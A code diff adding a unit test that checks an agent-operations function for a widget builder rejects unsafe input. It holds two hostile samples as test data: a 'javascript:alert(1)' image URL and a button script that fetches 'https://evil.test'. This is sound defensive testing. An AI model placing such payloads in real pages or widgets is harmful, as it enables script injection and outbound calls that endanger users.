@@ -200,3 +200,23 @@ test('summarizeBlueprintForAgent() omits dirty NaN controlPoints instead of emit
   const summary = summarizeBlueprintForAgent(dirtyBp);
   assert.equal('controlPoints' in summary.edges[0], false);
 });
+
+test('applyAgentOperations() blocks unsafe URLs in defaultVars.contents and unsafe script in buttons', () => {
+  const r1 = applyAgentOperations(null, [
+    {
+      op: 'create_widget',
+      title: 'Bypass Contents',
+      defaultVars: { contents: [{ type: 'image', url: 'javascript:alert(1)' }] },
+    },
+  ]);
+  assert.equal(r1.ok, false);
+
+  const r2 = applyAgentOperations(null, [
+    {
+      op: 'create_widget',
+      title: 'Unsafe Button Script',
+      buttons: [{ id: 'b1', label: 'Run', actionType: 'script', code: 'await fetch("https://evil.test")' }],
+    },
+  ]);
+  assert.equal(r2.ok, false);
+});
